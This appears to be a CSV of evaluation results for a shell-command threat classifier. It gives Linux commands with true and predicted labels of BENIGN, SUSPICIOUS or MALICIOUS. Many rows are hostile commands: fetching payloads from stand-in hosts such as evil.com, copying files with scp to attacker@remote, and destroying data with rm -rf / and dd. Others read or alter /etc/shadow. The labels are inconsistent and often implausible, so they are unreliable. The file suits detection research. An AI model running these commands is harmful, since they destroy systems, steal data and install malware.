command,true_label,predicted_label
echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
 CAT /HOME/USER/TODO.TXT,SUSPICIOUS,BENIGN
netstat -tulnp,MALICIOUS,SUSPICIOUS
cat   /etc/passwd,SUSPICIOUS,BENIGN
 watch netstat -an,SUSPICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
 cat /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
df   -h,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts ,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
wget http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
 ls /var/www,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,MALICIOUS
 CURL HTTPS://EVIL.COM/UPDATE.BIN,SUSPICIOUS,BENIGN
cd   /root/,BENIGN,MALICIOUS
touch   homework.doc,SUSPICIOUS,MALICIOUS
echo 'hacked' >   /root/.bashrc,SUSPICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
touch homework.doc,MALICIOUS,BENIGN
ifconfig,SUSPICIOUS,MALICIOUS
rm -rf   /,SUSPICIOUS,BENIGN
mv   /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
cd /root,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,BENIGN,SUSPICIOUS
DF -H ,SUSPICIOUS,MALICIOUS
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
 echo 'pwned' >> /etc/shadow,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,SUSPICIOUS
cat   /home/user/info.txt,BENIGN,SUSPICIOUS
sudo apt install nmap,MALICIOUS,SUSPICIOUS
echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
ssh -L   8080:target.com:80 attacker@remote,BENIGN,MALICIOUS
cat /etc/passwd,SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
WGET   HTTP://MALICIOUS.COM/PAYLOAD.SH,MALICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,BENIGN
sudo apt install net-tools,BENIGN,MALICIOUS
chmod 777 /etc/shadow,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
ls /tmp/,SUSPICIOUS,MALICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
rm -rf /,BENIGN,MALICIOUS
cd /root/,SUSPICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,SUSPICIOUS,BENIGN
echo   'pwned' > /etc/shadow,MALICIOUS,BENIGN
ps aux | grep sshd,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
curl -O   http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
sudo apt   install htop,SUSPICIOUS,MALICIOUS
cat   /root/.bashrc,MALICIOUS,SUSPICIOUS
echo 'hacked' >> /etc/shadow,BENIGN,SUSPICIOUS
iptables -F,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
sudo -l,MALICIOUS,SUSPICIOUS
rm -rf /,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,MALICIOUS
history,SUSPICIOUS,BENIGN
scp data.tar.gz user@192.168.0.2:/root/,SUSPICIOUS,BENIGN
which   python,SUSPICIOUS,MALICIOUS
ifconfig,MALICIOUS,BENIGN
df -h,BENIGN,SUSPICIOUS
cat welcome.txt,MALICIOUS,BENIGN
scp file.txt attacker@remote:/tmp/,MALICIOUS,BENIGN
 rm -rf /var/,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
iptables   -F,SUSPICIOUS,MALICIOUS
rm -rf /,MALICIOUS,BENIGN
 CAT WELCOME.TXT,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
cat /var/log/auth.log,BENIGN,SUSPICIOUS
chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
env,SUSPICIOUS,MALICIOUS
echo 'hello world',SUSPICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
sudo su,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
scp file.txt   admin@backup.server:/var/www,MALICIOUS,BENIGN
top -n   1,MALICIOUS,BENIGN
echo 'owned' >> /root/.bashrc,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
ls /root/ ,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
ifconfig,SUSPICIOUS,BENIGN
 rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,SUSPICIOUS
RM   -RF /HOME/USER,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,BENIGN
curl https://evil.com/payload.sh ,MALICIOUS,SUSPICIOUS
touch homework.doc,MALICIOUS,BENIGN
 cat notes.txt,MALICIOUS,BENIGN
cat   /root/.bashrc,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
cat /etc/passwd,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,MALICIOUS
echo 'pwned' >> /var/log/syslog,SUSPICIOUS,BENIGN
which python,MALICIOUS,BENIGN
echo 'hacked' >> /var/log/syslog,BENIGN,MALICIOUS
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
ls   /root/,SUSPICIOUS,BENIGN
sudo   su,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh ,SUSPICIOUS,MALICIOUS
cd /root/,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
 IPTABLES -F,SUSPICIOUS,BENIGN
sudo su,MALICIOUS,SUSPICIOUS
PS AUX,MALICIOUS,BENIGN
curl -O http://fileshare.com/exploit.zip,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
echo 'pwned' > /var/log/syslog,SUSPICIOUS,BENIGN
curl https://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
echo 'hello world' ,BENIGN,SUSPICIOUS
TOUCH HOMEWORK.DOC,MALICIOUS,SUSPICIOUS
which python,MALICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
ls   /tmp/,MALICIOUS,BENIGN
ifconfig,MALICIOUS,SUSPICIOUS
cat /root/.bashrc,MALICIOUS,BENIGN
iptables   -F,SUSPICIOUS,BENIGN
curl https://evil.com/payload.sh ,MALICIOUS,SUSPICIOUS
pwd,SUSPICIOUS,BENIGN
curl https://evil.com/update.bin,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
cd /tmp/,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
echo   'hello world',SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
du -sh ,SUSPICIOUS,BENIGN
rm -rf /home/user,SUSPICIOUS,BENIGN
curl -O   http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
which   python,SUSPICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
ps aux,SUSPICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
 ls /root/,BENIGN,MALICIOUS
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
cat   /root/.bashrc,MALICIOUS,BENIGN
SUDO APT INSTALL NMAP,MALICIOUS,SUSPICIOUS
cd /var/www,MALICIOUS,BENIGN
mkdir test ,SUSPICIOUS,BENIGN
cat   /etc/passwd,SUSPICIOUS,BENIGN
cat /home/user/todo.txt,SUSPICIOUS,BENIGN
curl https://suspicious.org/update.bin,MALICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
cat /home/user/todo.txt,BENIGN,MALICIOUS
sudo apt install net-tools,BENIGN,MALICIOUS
cd /tmp/,BENIGN,MALICIOUS
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
WATCH NETSTAT -AN ,MALICIOUS,SUSPICIOUS
rm -rf /,MALICIOUS,BENIGN
rm -rf   /,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
sudo apt install net-tools,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
 cat welcome.txt,MALICIOUS,BENIGN
ls   /root/,SUSPICIOUS,MALICIOUS
ping google.com,MALICIOUS,BENIGN
rm -rf   /* --no-preserve-root,MALICIOUS,BENIGN
whoami ,SUSPICIOUS,BENIGN
du -sh,BENIGN,MALICIOUS
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh ,SUSPICIOUS,BENIGN
 SUDO -L,MALICIOUS,SUSPICIOUS
cat /etc/passwd,MALICIOUS,BENIGN
env,MALICIOUS,SUSPICIOUS
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc ,MALICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd,MALICIOUS,SUSPICIOUS
grep 'password' /etc/passwd,MALICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
chmod   777 /root/.bashrc,SUSPICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
iptables -F,SUSPICIOUS,BENIGN
which python,MALICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc ,BENIGN,SUSPICIOUS
curl https://evil.com/payload.sh,MALICIOUS,BENIGN
 wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
 RM -RF /,MALICIOUS,SUSPICIOUS
rm -rf /var/ ,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
cat /var/log/syslog,BENIGN,MALICIOUS
ps aux,MALICIOUS,BENIGN
rm   -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
ifconfig,BENIGN,SUSPICIOUS
cd /var/www,MALICIOUS,SUSPICIOUS
cat welcome.txt,MALICIOUS,BENIGN
 wget http://evil.com/payload.sh,BENIGN,SUSPICIOUS
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,SUSPICIOUS,BENIGN
ECHO 'OWNED' >> /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
CURL -O HTTP://MALICIOUS.COM/MALWARE.BIN,MALICIOUS,BENIGN
mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
sudo apt install net-tools,MALICIOUS,BENIGN
IFCONFIG ,SUSPICIOUS,BENIGN
cat readme.md,SUSPICIOUS,MALICIOUS
ls /tmp/,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
chmod 777 /etc/shadow,MALICIOUS,BENIGN
ps aux | grep mysql ,MALICIOUS,BENIGN
PS AUX | GREP MYSQL ,SUSPICIOUS,BENIGN
WATCH NETSTAT -AN,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
sudo apt install nmap,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cat   welcome.txt,MALICIOUS,BENIGN
cat   readme.md,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
scp data.tar.gz root@malicious.com:/root/,SUSPICIOUS,BENIGN
curl   https://safe-site.org/update.sh,MALICIOUS,SUSPICIOUS
rm -rf /,MALICIOUS,BENIGN
iptables -F ,SUSPICIOUS,BENIGN
cat homework.txt ,BENIGN,SUSPICIOUS
cat   /var/log/syslog,MALICIOUS,BENIGN
find / -name 'test' ,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
cat /root/.bashrc,BENIGN,SUSPICIOUS
 wget http://fileshare.com/update.bin,MALICIOUS,BENIGN
rm -rf /home/user,BENIGN,SUSPICIOUS
curl -O http://evil.com/exploit.zip,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
env,MALICIOUS,BENIGN
watch netstat -an,MALICIOUS,BENIGN
ssh -L   8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
echo 'hello',SUSPICIOUS,BENIGN
cat   /var/log/syslog,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
sudo apt install nmap,MALICIOUS,BENIGN
sudo apt install htop,SUSPICIOUS,MALICIOUS
grep 'password'   /etc/passwd,BENIGN,SUSPICIOUS
mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
which python,MALICIOUS,BENIGN
CAT   /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
echo 'pwned' >> /etc/shadow,MALICIOUS,BENIGN
cd /root/ ,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
cat /etc/shadow,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,SUSPICIOUS
ps aux | grep mysql,MALICIOUS,SUSPICIOUS
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
cd /root,MALICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,BENIGN,SUSPICIOUS
watch netstat -an,MALICIOUS,BENIGN
cat .bashrc,MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
du -sh ,MALICIOUS,SUSPICIOUS
cat /etc/shadow,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
rm -rf / ,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
cat   homework.txt,SUSPICIOUS,MALICIOUS
cat readme.md,MALICIOUS,BENIGN
history,MALICIOUS,BENIGN
ps   aux,SUSPICIOUS,BENIGN
grep root /etc/passwd,SUSPICIOUS,BENIGN
chmod 777 /var/log/syslog,SUSPICIOUS,MALICIOUS
curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
uname -a,BENIGN,SUSPICIOUS
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
which   python,SUSPICIOUS,MALICIOUS
ECHO   'PWNED' >> /VAR/LOG/SYSLOG,BENIGN,SUSPICIOUS
CAT /ETC/PASSWD,MALICIOUS,BENIGN
echo 'hacked'   >> /root/.bashrc,MALICIOUS,BENIGN
CURL -O HTTP://SUSPICIOUS.ORG/EXPLOIT.ZIP,SUSPICIOUS,BENIGN
iptables -F,MALICIOUS,BENIGN
 wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,MALICIOUS
cat   /root/.bashrc,SUSPICIOUS,BENIGN
cat /var/log/syslog,BENIGN,MALICIOUS
sudo apt install net-tools,SUSPICIOUS,BENIGN
CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
 curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
cat welcome.txt,SUSPICIOUS,BENIGN
cat .bashrc,MALICIOUS,SUSPICIOUS
CD /TMP/,MALICIOUS,BENIGN
curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts ,MALICIOUS,SUSPICIOUS
cat .bashrc,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
rm   -rf /,SUSPICIOUS,BENIGN
echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
cat /var/log/auth.log,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
wget http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
grep root /etc/passwd,BENIGN,MALICIOUS
grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
SUDO -L,SUSPICIOUS,BENIGN
cat /home/user/info.txt,SUSPICIOUS,BENIGN
scp backup.sql   admin@backup.server:/var/www,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,BENIGN
sudo apt install net-tools,SUSPICIOUS,MALICIOUS
RM -RF /VAR/,MALICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,BENIGN,MALICIOUS
cat   /etc/passwd,SUSPICIOUS,BENIGN
top -n 1,MALICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
touch   homework.doc,MALICIOUS,BENIGN
cat /var/log/syslog,MALICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd ,SUSPICIOUS,BENIGN
grep 'password' /etc/passwd ,MALICIOUS,BENIGN
which python,MALICIOUS,BENIGN
wget http://evil.com/payload.sh,SUSPICIOUS,BENIGN
scp file.txt root@backup.server:/root/,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,MALICIOUS
scp backup.sql root@backup.server:/var/www,SUSPICIOUS,BENIGN
CURL HTTPS://SUSPICIOUS.ORG/UPDATE.BIN,MALICIOUS,BENIGN
ps aux | grep nginx,MALICIOUS,BENIGN
DF -H,BENIGN,MALICIOUS
sudo -l,MALICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,MALICIOUS
ls /var/www,BENIGN,SUSPICIOUS
cat /var/log/auth.log,BENIGN,SUSPICIOUS
cat notes.txt,BENIGN,MALICIOUS
watch netstat -an,SUSPICIOUS,MALICIOUS
ls /var/www,MALICIOUS,BENIGN
 cat /etc/shadow,SUSPICIOUS,BENIGN
 chmod 777 /var/log/syslog,MALICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
 dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
touch   homework.doc,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
 cat /etc/shadow,SUSPICIOUS,BENIGN
 which python,SUSPICIOUS,BENIGN
rm -rf / ,SUSPICIOUS,BENIGN
curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
df -h,MALICIOUS,BENIGN
find / -name 'test',MALICIOUS,BENIGN
chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
 sudo apt install net-tools,MALICIOUS,BENIGN
sudo su ,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
ls /var/www,MALICIOUS,BENIGN
grep root /etc/passwd,MALICIOUS,BENIGN
top -n 1,SUSPICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,SUSPICIOUS
netstat -tulnp,SUSPICIOUS,MALICIOUS
df   -h,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
SUDO APT UPDATE,BENIGN,MALICIOUS
wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
cat /etc/passwd,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
ping google.com,MALICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
env,SUSPICIOUS,BENIGN
wget http://fileshare.com/payload.sh,MALICIOUS,BENIGN
uname -a,SUSPICIOUS,BENIGN
sudo -l,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
ls -al,SUSPICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
SUDO APT INSTALL HTOP ,SUSPICIOUS,BENIGN
ls /root/,SUSPICIOUS,BENIGN
history,MALICIOUS,BENIGN
cat ~/.ssh/known_hosts,BENIGN,SUSPICIOUS
 DU -SH,SUSPICIOUS,BENIGN
chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
ps aux | grep sshd,BENIGN,SUSPICIOUS
echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
chmod 777 /root/.bashrc,MALICIOUS,BENIGN
sudo su,SUSPICIOUS,BENIGN
whoami,MALICIOUS,BENIGN
du -sh,SUSPICIOUS,BENIGN
echo 'hacked' >> /etc/shadow,BENIGN,MALICIOUS
df -h,MALICIOUS,BENIGN
ps aux | grep sshd,BENIGN,SUSPICIOUS
which python,BENIGN,SUSPICIOUS
grep root /etc/passwd,MALICIOUS,BENIGN
which python,SUSPICIOUS,BENIGN
cat /etc/shadow,SUSPICIOUS,BENIGN
cat   /home/user/info.txt,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
sudo -l,SUSPICIOUS,BENIGN
uname -a,MALICIOUS,BENIGN
netstat -tulnp,SUSPICIOUS,MALICIOUS
sudo su,SUSPICIOUS,BENIGN
touch homework.doc,MALICIOUS,SUSPICIOUS
cat ~/.ssh/known_hosts,MALICIOUS,BENIGN
echo 'hello world',SUSPICIOUS,BENIGN
echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
echo 'hacked' >> /root/.bashrc,MALICIOUS,BENIGN
ps aux   | grep sshd,SUSPICIOUS,BENIGN
ls -al,BENIGN,SUSPICIOUS
rm -rf /var/,SUSPICIOUS,BENIGN
cat   /etc/shadow,SUSPICIOUS,BENIGN
CAT /HOME/USER/TODO.TXT,MALICIOUS,BENIGN
cd /root/,MALICIOUS,BENIGN
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
cat /home/user/info.txt,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
cat   /root/.bashrc,SUSPICIOUS,BENIGN
dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
 pwd,MALICIOUS,BENIGN
echo 'hacked' >   /var/log/syslog,BENIGN,MALICIOUS
 curl https://evil.com/update.bin,SUSPICIOUS,BENIGN
curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
netstat -tulnp,BENIGN,SUSPICIOUS
find / -name 'test',SUSPICIOUS,BENIGN
echo 'pwned' > /root/.bashrc,SUSPICIOUS,BENIGN
cd /var/www,SUSPICIOUS,BENIGN
cat .bashrc,SUSPICIOUS,BENIGN
sudo apt install nmap,BENIGN,MALICIOUS
sudo -l,MALICIOUS,BENIGN
 curl https://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
cat welcome.txt,MALICIOUS,BENIGN
 echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
history,SUSPICIOUS,BENIGN
watch netstat -an,SUSPICIOUS,BENIGN
ls /root/,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
rm -rf /,MALICIOUS,BENIGN
CAT   /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
du -sh,MALICIOUS,BENIGN
curl -O http://fileshare.com/update.bin,MALICIOUS,BENIGN
ps aux | grep mysql,SUSPICIOUS,BENIGN
mkdir test,SUSPICIOUS,BENIGN
rm -rf /,SUSPICIOUS,BENIGN
find / -name 'test',SUSPICIOUS,BENIGN
pwd,MALICIOUS,SUSPICIOUS
sudo apt install net-tools,MALICIOUS,BENIGN
sudo apt update,SUSPICIOUS,BENIGN
cat /root/.bashrc,SUSPICIOUS,BENIGN
cat /root/.bashrc,MALICIOUS,BENIGN
pwd,MALICIOUS,BENIGN
wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
cat /home/user/info.txt,BENIGN,SUSPICIOUS
uname -a,SUSPICIOUS,BENIGN
mkdir test,MALICIOUS,SUSPICIOUS
ls -al,MALICIOUS,BENIGN
env,SUSPICIOUS,MALICIOUS
sudo apt update,SUSPICIOUS,BENIGN
scp backup.sql admin@192.168.0.2:/root/,SUSPICIOUS,BENIGN
sudo apt update,MALICIOUS,BENIGN
curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
pwd,SUSPICIOUS,BENIGN
mkdir   test,SUSPICIOUS,BENIGN
ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
wget http://evil.com/payload.sh,MALICIOUS,BENIGN
ps aux,MALICIOUS,BENIGN
cat /var/log/syslog,SUSPICIOUS,BENIGN
ping google.com,SUSPICIOUS,BENIGN
sudo apt install htop,MALICIOUS,BENIGN
history ,MALICIOUS,BENIGN
mkdir test,MALICIOUS,BENIGN
scp   file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
env,MALICIOUS,BENIGN
cat homework.txt,MALICIOUS,BENIGN
uname -a,BENIGN,MALICIOUS
sudo su,MALICIOUS,BENIGN
iptables   -F,MALICIOUS,BENIGN
touch homework.doc,SUSPICIOUS,BENIGN
ls -al,MALICIOUS,BENIGN
cat readme.md,SUSPICIOUS,BENIGN
scp file.txt   attacker@remote:/tmp/,SUSPICIOUS,BENIGN
rm -rf   /,SUSPICIOUS,MALICIOUS
curl http://unknown.site/script.sh,MALICIOUS,BENIGN
 sudo apt install net-tools,MALICIOUS,BENIGN
curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
curl -O http://suspicious.org/payload.sh,MALICIOUS,BENIGN
cat   /var/log/syslog,SUSPICIOUS,BENIGN
echo 'hello',MALICIOUS,BENIGN
iptables   -F,MALICIOUS,BENIGN
